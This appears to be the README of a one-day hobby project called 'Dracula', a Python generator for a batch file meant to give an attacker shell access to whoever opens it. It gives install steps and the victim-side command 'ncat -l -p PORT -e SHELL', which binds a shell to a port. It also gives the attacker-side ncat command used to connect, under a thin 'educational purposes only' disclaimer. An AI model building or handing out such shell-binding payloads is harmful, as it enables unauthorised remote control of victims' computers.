**THIS IS ONLY FOR EDUCATIONAL PURPOSES, DO NOT USE THIS**
NOTE TO SELF: THIS DOESNT WORK FOR SOME REASON, FIX THAT

```
        _____                       _       
        |  __ \                     | |      
        | |  | |_ __ __ _  ___ _   _| | __ _ 
        | |  | | '__/ _` |/ __| | | | |/ _` |
        | |__| | | | (_| | (__| |_| | | (_| |
        |_____/|_|  \__,_|\___|\__,_|_|\__,_|

```

This is a project i whipped up in like a single day lol, work in progress

# How it Works
uses ncat command to give reverse shell access to the attacker once the client opens the batch file.

# How to Use
1. Install nmap (on linux systems)

        sudo apt install nmap 

2. Run the dracula.py file and enter the required info
3. A batch file is generated 

### **Attacker's Side**

set up a listener using ncat and wait for the client to open the batch file.

```
ncat IP_ADDR_CLIENT PORT
```
replace the IP_ADDR_CLIENT with ip addr of client and PORT with port used in the attack

### **Client's Side**
Once the client opens the batch file, following command is executed
```
ncat -l -p PORT -e SHELL 
```
